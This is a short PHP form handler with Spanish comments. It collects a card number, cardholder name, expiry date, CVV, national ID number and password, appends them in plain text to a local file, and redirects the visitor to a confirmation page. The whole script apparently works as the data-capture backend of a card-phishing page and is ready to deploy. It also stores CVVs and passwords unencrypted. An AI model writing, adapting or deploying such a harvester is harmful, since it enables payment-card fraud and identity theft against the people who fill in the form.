<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Recoger los datos del formulario
    $numero_tarjeta = htmlspecialchars($_POST['numero_tarjeta']);
    $nombre_propietario = htmlspecialchars($_POST['nombre_propietario']);
    $fecha_vencimiento = htmlspecialchars($_POST['fecha_vencimiento']);
    $cvv = htmlspecialchars($_POST['cvv']);
    $cedula = htmlspecialchars($_POST['cedula']);
    $contraseña = htmlspecialchars($_POST['contraseña']);

    // Formatear los datos para guardarlos
    $datos = "Número de Tarjeta: $numero_tarjeta\nNombre del Propietario: $nombre_propietario\nFecha de Vencimiento: $fecha_vencimiento\nCVV: $cvv\nCédula: $cedula\nContraseña: $contraseña\n\n";

    // Guardar los datos en un archivo txt
    file_put_contents('datos.txt', $datos, FILE_APPEND);

    // Redirigir a una página de confirmación
    header('Location: confirmacion.html');
    exit();
}
?>